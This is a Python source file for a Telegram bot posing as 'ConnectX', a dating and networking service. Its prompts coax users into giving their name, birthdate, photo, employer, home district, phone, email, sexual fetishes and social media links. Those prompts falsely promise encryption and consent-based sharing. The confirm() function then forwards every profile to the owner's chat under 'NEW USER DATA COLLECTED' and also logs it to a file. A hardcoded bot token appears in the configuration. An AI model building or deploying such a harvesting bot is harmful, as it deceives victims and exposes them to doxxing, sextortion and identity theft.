import logging
import re
from datetime import datetime
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardRemove
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackQueryHandler,
    filters
)
from telegram.constants import ParseMode
import asyncio

# Bot Configuration
TOKEN = "8095148333:AAEfFkptpPq3PkNJyeBZrbaj62bSDkexgXk"  # Replace with your bot token
OWNER_ID = "123456789"  # Your numeric Telegram ID
OWNER_USERNAME = "telegramusernamehere"  # Replace with your Telegram username (without @)

# Conversation states
NAME, BIRTHDATE, AGE_CONFIRM, RELATIONSHIP, PHOTO, PROFESSION, COMPANY, LOCATION, DISTRICT, PHONE, EMAIL, FETISH, HOBBIES, TELEGRAM_USERNAME, SOCIAL_FACEBOOK, SOCIAL_INSTAGRAM, SOCIAL_THREADS, SOCIAL_X, SOCIAL_LINKEDIN, CONFIRM = range(20)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Relationship options
RELATIONSHIP_OPTIONS = [
    ["Single", "In a relationship"],
    ["Married", "Divorced"],
    ["It's complicated", "Prefer not to say"]
]

# Social media platforms and their link prefixes
PLATFORMS = {
    "Facebook": ["https://www.facebook.com/", "http://www.facebook.com/"],
    "Instagram": ["https://www.instagram.com/", "http://www.instagram.com/"],
    "Threads": ["https://www.threads.net/", "http://www.threads.net/"],
    "X": ["https://twitter.com/", "http://twitter.com/"],
    "LinkedIn": ["https://www.linkedin.com/in/", "http://www.linkedin.com/in/"]
}

# Helper: safe reply with timeout
async def safe_reply(method, *args, **kwargs):
    try:
        await asyncio.wait_for(method(*args, **kwargs), timeout=15)
    except asyncio.TimeoutError:
        pass
    except Exception as e:
        logger.error(f"Reply error: {e}")

# Validation functions
def is_valid_date(date_str):
    pattern = r'\d{4}-\d{2}-\d{2}'
    return re.match(pattern, date_str) is not None

def calculate_age(birthdate_str):
    try:
        birthdate = datetime.strptime(birthdate_str, "%Y-%m-%d")
        today = datetime.now()
        if birthdate > today:
            return None  # Birthdate in the future is invalid
        age = today.year - birthdate.year - ((today.month, today.day) < (birthdate.month, birthdate.day))
        return age
    except ValueError:
        return None

def is_valid_email(email_str):
    pattern = r'[^@]+@[^@]+\.[^@]+'
    return re.match(pattern, email_str) is not None

def is_valid_phone(phone_str):
    pattern = r'\+?\d[\d -]{8,}\d'
    return re.match(pattern, phone_str) is not None

def is_non_empty(text):
    return bool(text.strip())

async def start(update: Update, context):
    user = update.message.from_user
    await update.message.reply_text(
        f"👋 Hello {user.first_name}!\n\n"
        "Welcome to *ConnectX* - Find business partners, friends, or meaningful connections!\n\n"
        "We'll collect some basic info to find your perfect matches. Please be honest and accurate on your answers because that is how we make perfect matches for you🫶 "
        "Your data is encrypted and protected for your safety.\n\n"
        "Press /register to begin your journey!",
        parse_mode=ParseMode.MARKDOWN
    )

async def register(update: Update, context):
    await update.message.reply_text(
        "🌟 Let's create your profile!\n\n"
        "Please enter your *full name* so people know how to address you:",
        parse_mode=ParseMode.MARKDOWN
    )
    return NAME

async def get_name(update: Update, context):
    name = update.message.text
    if is_non_empty(name):
        context.user_data['name'] = name
        await update.message.reply_text(
            "🎂 What is your birthdate? Fill in this because you or someone may be concerned about birthdate compatibility (e.g., 1990-01-01)",
            parse_mode=ParseMode.MARKDOWN
        )
        return BIRTHDATE
    else:
        await update.message.reply_text(
            "❌ Name cannot be empty. Please enter your full name."
        )
        return NAME

async def get_birthdate(update: Update, context):
    birthdate = update.message.text
    if is_valid_date(birthdate):
        age = calculate_age(birthdate)
        if age is not None and age >= 0:
            context.user_data['birthdate'] = birthdate
            context.user_data['calculated_age'] = age
            keyboard = [
                [InlineKeyboardButton("Yes", callback_data="yes_age"), InlineKeyboardButton("No", callback_data="no_age")]
            ]
            await update.message.reply_text(
                f"Based on your birthdate ({birthdate}), you are {age} years old. Is this correct?",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return AGE_CONFIRM
        else:
            await update.message.reply_text(
                "❌ Invalid birthdate. It must be in YYYY-MM-DD format and not in the future."
            )
            return BIRTHDATE
    else:
        await update.message.reply_text(
            "❌ Invalid birthdate format. Please use YYYY-MM-DD (e.g., 1990-01-01)."
        )
        return BIRTHDATE

async def confirm_age(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "yes_age":
        context.user_data['age'] = context.user_data['calculated_age']
        reply_keyboard = RELATIONSHIP_OPTIONS
        await query.edit_message_text(
            "Age confirmed.",
            reply_markup=None
        )
        await query.message.reply_text(
            "💖 What's your relationship status? Be honest here so we can find your best interests",
            reply_markup=ReplyKeyboardMarkup(
                reply_keyboard,
                one_time_keyboard=True,
                input_field_placeholder="Select your status"
            )
        )
        return RELATIONSHIP
    else:
        await query.edit_message_text(
            "Please enter your correct birthdate (YYYY-MM-DD):"
        )
        return BIRTHDATE

async def get_relationship(update: Update, context):
    context.user_data['relationship'] = update.message.text
    await update.message.reply_text(
        "🖼️ Now upload a profile photo, a clear photo of yourself may help you attract potential partners (send as image, not file):",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode=ParseMode.MARKDOWN
    )
    return PHOTO

async def get_photo(update: Update, context):
    if update.message.photo:
        photo = await update.message.photo[-1].get_file()
        context.user_data['photo_id'] = photo.file_id
        await safe_reply(update.message.reply_text,
            "💼 What's your profession? So we can get you appealing matches",
            parse_mode=ParseMode.MARKDOWN
        )
        return PROFESSION
    else:
        await safe_reply(update.message.reply_text,
            "❌ Please send a photo for your profile.")
        return PHOTO

async def get_profession(update: Update, context):
    profession = update.message.text
    if is_non_empty(profession):
        context.user_data['profession'] = profession
        await update.message.reply_text(
            "🏢 Where do you work? (Company name), this adds validity for your profession.",
            parse_mode=ParseMode.MARKDOWN
        )
        return COMPANY
    else:
        await update.message.reply_text(
            "❌ Profession cannot be empty. Please enter your profession."
        )
        return PROFESSION

async def get_company(update: Update, context):
    company = update.message.text
    if is_non_empty(company):
        context.user_data['company'] = company
        await update.message.reply_text(
            "📍 Which city or state do you live in? So we wouldn't fetch you long distance matches. For example, if you live in Hong Kong, fill in Hong Kong.",
            parse_mode=ParseMode.MARKDOWN
        )
        return LOCATION
    else:
        await update.message.reply_text(
            "❌ Company name cannot be empty. Please enter your company name."
        )
        return COMPANY

async def get_location(update: Update, context):
    location = update.message.text
    if is_non_empty(location):
        context.user_data['location'] = location
        await update.message.reply_text(
            "🏙️ Which city/district? We can make it possible to cuddle your partner close. For example, if you live in Wan Chai district, then fill in Wan Chai.",
            parse_mode=ParseMode.MARKDOWN
        )
        return DISTRICT
    else:
        await update.message.reply_text(
            "❌ Location cannot be empty. Please enter the place you live."
        )
        return LOCATION

async def get_district(update: Update, context):
    district = update.message.text
    if is_non_empty(district):
        context.user_data['district'] = district
        await update.message.reply_text(
            "📱 Please share your phone number, the info will only be shared upon your permission, we will send back a confirmation message to you before telling your potential partner.:",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("Share Contact", request_contact=True)]],
                one_time_keyboard=True
            ),
            parse_mode=ParseMode.MARKDOWN
        )
        return PHONE
    else:
        await update.message.reply_text(
            "❌ District cannot be empty. Please enter your city/district."
        )
        return DISTRICT

async def get_phone(update: Update, context):
    if update.message.contact:
        context.user_data['phone'] = update.message.contact.phone_number
        await update.message.reply_text(
            "📧 Your email address?",
            reply_markup=ReplyKeyboardRemove(),
            parse_mode=ParseMode.MARKDOWN
        )
        return EMAIL
    else:
        phone = update.message.text
        if is_valid_phone(phone):
            context.user_data['phone'] = phone
            await update.message.reply_text(
                "📧 Your email address? We notify you matches.",
                parse_mode=ParseMode.MARKDOWN
            )
            return EMAIL
        else:
            await update.message.reply_text(
                "❌ Invalid phone number. Please enter a valid number (e.g., +1234567890) or share your contact."
            )
            return PHONE

async def get_email(update: Update, context):
    email = update.message.text
    if is_valid_email(email):
        context.user_data['email'] = email
        await update.message.reply_text(
            "🔞 What are your fetishes? We hope to match you with partners who share the same fetishes but are too shy to tell. Don't worry, we are keeping secrets here. (Type 'None' if you really have none)",
            parse_mode=ParseMode.MARKDOWN
        )
        return FETISH
    else:
        await update.message.reply_text(
            "❌ Invalid email format. Please enter a valid email (e.g., example@domain.com)."
        )
        return EMAIL

async def get_fetish(update: Update, context):
    context.user_data['fetish'] = update.message.text or "None"
    await update.message.reply_text(
        "🎲 What are your hobbies?",
        parse_mode=ParseMode.MARKDOWN
    )
    return HOBBIES

async def get_hobbies(update: Update, context):
    context.user_data['hobbies'] = update.message.text or "None"
    await update.message.reply_text(
        "Please enter your Telegram username (without @):",
        parse_mode=ParseMode.MARKDOWN
    )
    return TELEGRAM_USERNAME

async def get_telegram_username(update: Update, context):
    username = update.message.text.strip().lstrip('@')
    context.user_data['telegram_username'] = username
    await update.message.reply_text(
        "Let's add your social media profiles. Providing your social media helps us verify your identity and increases your chances of finding genuine matches. If you don't have an account, type 'skip'.\n\n"
        "Please enter your Facebook profile link (e.g., https://www.facebook.com/username) or 'skip':",
        parse_mode=ParseMode.MARKDOWN
    )
    return SOCIAL_FACEBOOK

async def get_social_facebook(update: Update, context):
    link = update.message.text
    if link.lower() == 'skip' or any(link.startswith(prefix) for prefix in PLATFORMS["Facebook"]):
        context.user_data['facebook'] = link if link.lower() != 'skip' else None
        await update.message.reply_text(
            "Please enter your Instagram profile link (e.g., https://www.instagram.com/username) or 'skip':",
            parse_mode=ParseMode.MARKDOWN
        )
        return SOCIAL_INSTAGRAM
    else:
        await update.message.reply_text(
            "❌ Invalid Facebook link. It must start with 'https://www.facebook.com/'. Please try again or type 'skip'."
        )
        return SOCIAL_FACEBOOK

async def get_social_instagram(update: Update, context):
    link = update.message.text
    if link.lower() == 'skip' or any(link.startswith(prefix) for prefix in PLATFORMS["Instagram"]):
        context.user_data['instagram'] = link if link.lower() != 'skip' else None
        await update.message.reply_text(
            "Please enter your Threads profile link (e.g., https://www.threads.net/username) or 'skip':",
            parse_mode=ParseMode.MARKDOWN
        )
        return SOCIAL_THREADS
    else:
        await update.message.reply_text(
            "❌ Invalid Instagram link. It must start with 'https://www.instagram.com/'. Please try again or type 'skip'."
        )
        return SOCIAL_INSTAGRAM

async def get_social_threads(update: Update, context):
    link = update.message.text
    if link.lower() == 'skip' or any(link.startswith(prefix) for prefix in PLATFORMS["Threads"]):
        context.user_data['threads'] = link if link.lower() != 'skip' else None
        await update.message.reply_text(
            "Please enter your X profile link (e.g., https://x.com/username) or 'skip':",
            parse_mode=ParseMode.MARKDOWN
        )
        return SOCIAL_X
    else:
        await update.message.reply_text(
            "❌ Invalid Threads link. It must start with 'https://www.threads.net/'. Please try again or type 'skip'."
        )
        return SOCIAL_THREADS

async def get_social_x(update: Update, context):
    link = update.message.text
    # Accept both https://x.com/ and https://twitter.com/ for compatibility, but prompt for X
    if link.lower() == 'skip' or link.startswith('https://x.com/') or link.startswith('http://x.com/'):
        context.user_data['x'] = link if link.lower() != 'skip' else None
        await update.message.reply_text(
            "Please enter your LinkedIn profile link (e.g., https://www.linkedin.com/in/username) or 'skip':",
            parse_mode=ParseMode.MARKDOWN
        )
        return SOCIAL_LINKEDIN
    else:
        await update.message.reply_text(
            "❌ Invalid X link. It must start with 'https://x.com/'. Please try again or type 'skip'."
        )
        return SOCIAL_X

async def get_social_linkedin(update: Update, context):
    link = update.message.text
    if link.lower() == 'skip' or any(link.startswith(prefix) for prefix in PLATFORMS["LinkedIn"]):
        context.user_data['linkedin'] = link if link.lower() != 'skip' else None
        user_data = context.user_data
        social_media = "\n".join([f"- {platform}: {user_data.get(platform.lower(), 'Not provided')}" for platform in PLATFORMS.keys()])
        summary = (
            "✅ Profile Summary:\n\n"
            f"👤 Name: {user_data['name']}\n"
            f"🎂 Birthdate: {user_data['birthdate']}\n"
            f"🎂 Age: {user_data['age']}\n"
            f"💖 Relationship: {user_data['relationship']}\n"
            f"💼 Profession: {user_data['profession']}\n"
            f"🏢 Company: {user_data['company']}\n"
            f"🌍 Location: {user_data['location']} / {user_data['district']}\n"
            f"📱 Phone: {user_data['phone']}\n"
            f"📧 Email: {user_data['email']}\n"
            f"🔞 Fetish: {user_data['fetish']}\n"
            f"🎲 Hobbies: {user_data['hobbies']}\n"
            f"👤 Telegram Username: @{user_data.get('telegram_username', 'Not provided')}\n"
            f"🔗 Social Media:\n{social_media}\n\n"
            "Press Confirm to submit your profile!"
        )
        keyboard = [
            [InlineKeyboardButton("✅ Confirm", callback_data="confirm")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
        ]
        if 'photo_id' in user_data:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=user_data['photo_id'],
                caption=summary,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await update.message.reply_text(
                summary,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode=ParseMode.MARKDOWN
            )
        return CONFIRM
    else:
        await update.message.reply_text(
            "❌ Invalid LinkedIn link. It must start with 'https://www.linkedin.com/in/'. Please try again or type 'skip'."
        )
        return SOCIAL_LINKEDIN

async def confirm(update: Update, context):
    query = update.callback_query
    await query.answer()
    user_data = context.user_data
    social_media = "\n".join([f"- {platform}: {user_data.get(platform.lower(), 'Not provided')}" for platform in PLATFORMS.keys()])
    collected_data = (
        f"🚨 NEW USER DATA COLLECTED 🚨\n\n"
        f"User ID: {update.effective_user.id}\n"
        f"Username: @{update.effective_user.username or 'N/A'}\n"
        f"Telegram Username: @{user_data.get('telegram_username', 'Not provided')}\n"
        f"Name: {user_data['name']}\n"
        f"Birthdate: {user_data['birthdate']}\n"
        f"Age: {user_data['age']}\n"
        f"Relationship: {user_data['relationship']}\n"
        f"Phone: {user_data['phone']}\n"
        f"Email: {user_data['email']}\n"
        f"Location: {user_data['location']}/{user_data['district']}\n"
        f"Work: {user_data['profession']} at {user_data['company']}\n"
        f"Fetish: {user_data['fetish']}\n"
        f"Hobbies: {user_data['hobbies']}\n"
        f"Social Media:\n{social_media}\n\n"
        f"#datacollection #userprofile"
    )
    success = False
    try:
        await context.bot.send_message(
            chat_id=int(OWNER_ID),
            text=collected_data
        )
        if 'photo_id' in user_data:
            await context.bot.send_photo(
                chat_id=int(OWNER_ID),
                photo=user_data['photo_id'],
                caption=f"Photo for: {user_data['name']}"
            )
        success = True
    except Exception as e:
        logger.error(f"Failed to send to OWNER_ID: {e}")
    if not success:
        try:
            await context.bot.send_message(
                chat_id=f"@{OWNER_USERNAME}",
                text=collected_data
            )
            if 'photo_id' in user_data:
                await context.bot.send_photo(
                    chat_id=f"@{OWNER_USERNAME}",
                    photo=user_data['photo_id'],
                    caption=f"Photo for: {user_data['name']}"
                )
            success = True
        except Exception as e:
            logger.error(f"Failed to send to OWNER_USERNAME: {e}")
    if not success:
        try:
            with open("user_data_log.txt", "a", encoding="utf-8") as f:
                f.write(f"{datetime.now()} - User Data:\n{collected_data}\n{'-'*50}\n")
            logger.info("Data logged to user_data_log.txt")
        except Exception as e:
            logger.error(f"Failed to log to file: {e}")
            await query.edit_message_text(
                f"❌ Error: Could not send your data to the owner or log it. Please try again later."
            )
            return ConversationHandler.END
    if query.message.photo:
        await query.edit_message_caption(
            caption="✅ Thank you for submitting your profile!\n\nWe appreciate your time and trust. Our team will review your information and notify you if there is a match. Good luck on your journey!",
            reply_markup=None
        )
    else:
        await query.edit_message_text(
            text="✅ Thank you for submitting your profile!\n\nWe appreciate your time and trust. Our team will review your information and notify you if there is a match. Good luck on your journey!",
            reply_markup=None
        )
    return ConversationHandler.END

async def cancel(update: Update, context):
    await update.message.reply_text(
        "❌ Operation cancelled."
    )
    return ConversationHandler.END

def main():
    application = Application.builder().token(TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("register", register)],
        states={
            NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
            BIRTHDATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_birthdate)],
            AGE_CONFIRM: [CallbackQueryHandler(confirm_age)],
            RELATIONSHIP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_relationship)],
            PHOTO: [MessageHandler(filters.PHOTO, get_photo)],
            PROFESSION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_profession)],
            COMPANY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_company)],
            LOCATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_location)],
            DISTRICT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_district)],
            PHONE: [MessageHandler(filters.TEXT | filters.CONTACT, get_phone)],
            EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
            FETISH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_fetish)],
            HOBBIES: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_hobbies)],
            TELEGRAM_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_telegram_username)],
            SOCIAL_FACEBOOK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_social_facebook)],
            SOCIAL_INSTAGRAM: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_social_instagram)],
            SOCIAL_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_social_threads)],
            SOCIAL_X: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_social_x)],
            SOCIAL_LINKEDIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_social_linkedin)],
            CONFIRM: [CallbackQueryHandler(confirm)]
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.run_polling()

if __name__ == "__main__":
    main()
